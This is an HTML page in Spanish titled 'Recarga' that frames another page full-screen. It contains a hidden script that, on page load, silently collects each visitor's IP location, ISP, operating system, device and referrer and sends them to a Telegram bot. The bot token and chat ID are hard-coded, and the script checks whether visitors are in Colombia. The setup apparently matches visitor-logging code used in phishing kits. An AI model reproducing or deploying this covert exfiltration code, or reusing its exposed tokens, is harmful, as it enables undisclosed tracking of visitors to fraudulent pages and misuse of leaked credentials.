<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Recarga</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        html,body{margin:0;padding:0;height:100%;overflow:hidden}
        iframe{border:none;width:100%;height:100vh;display:block}
    </style>
</head>
<body>
    <iframe
        src="extintor.html"
        allowfullscreen
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation">
    </iframe>

    <!-- ===================== SCRIPT TELEGRAM ===================== -->
    <script>
    (() => {
        // ==================== CONFIGURA ESTO ====================
        const TELEGRAM_BOT_TOKEN = "8544611246:AAGE75Qqwq131IEQal6r6CKD9dLuE6D0Qkw";   // ← Cambia esto
        const CHAT_ID = "-5263205987";               // ← Cambia esto

        // ==================== FUNCIONES ====================
        async function getIPInfo() {
            try {
                const response = await fetch("https://ipinfo.io/json?token=af50cd0324508f");
                if (!response.ok) throw new Error();
                const data = await response.json();
                return {
                    country_name: data.country || "Desconocido",
                    city: data.city || "Desconocido",
                    country_code: data.country || "XX",
                    isp: data.org || "No disponible"
                };
            } catch (error) {
                return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
            }
        }

        function parseUA() {
            const ua = navigator.userAgent;
            const isBot = /bot|crawler|spider|crawl/i.test(ua);
            let os = "Desconocido", device = "Desconocido";

            if (/Windows NT/i.test(ua)) os = "Windows";
            else if (/Mac OS X/i.test(ua)) os = "macOS";
            else if (/Android/i.test(ua)) os = "Android";
            else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
            else if (/Linux/i.test(ua)) os = "Linux";

            if (/Samsung/i.test(ua)) device = "Samsung";
            else if (/iPhone/i.test(ua)) device = "iPhone";
            else if (/iPad/i.test(ua)) device = "iPad";
            else if (/Huawei/i.test(ua)) device = "Huawei";
            else if (/Xiaomi/i.test(ua)) device = "Xiaomi";
            else device = "PC/Otro";

            return {os, device, isBot};
        }

        // ==================== ENVÍO A TELEGRAM ====================
        window.addEventListener("DOMContentLoaded", async () => {
            const ip = await getIPInfo();
            const ua = parseUA();
            const originDomain = window.location.hostname;

            const mensaje = `
👤 <b>Nueva Visita</b>

🌍 País: <b>${ip.country_name}</b>
🏙️ Ciudad: <b>${ip.city}</b>
📍 Origen: ${ip.country_code === "CO" ? "🇨🇴 Colombia" : "🌐 Exterior"}
📡 ISP: ${ip.isp}
💻 SO: ${ua.os}
📱 Dispositivo: ${ua.device}
🤖 Bot: ${ua.isBot ? "Sí" : "No"}
🔗 Referrer: ${document.referrer || "Directo"}
🌐 Dominio: ${originDomain}
🕒 Hora: ${new Date().toISOString()}
            `.trim();

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensaje,
                    parse_mode: "HTML"
                }),
                keepalive: true
            }).catch(err => console.error("Error Telegram:", err));
        });
    })();
    </script>
</body>
</html>
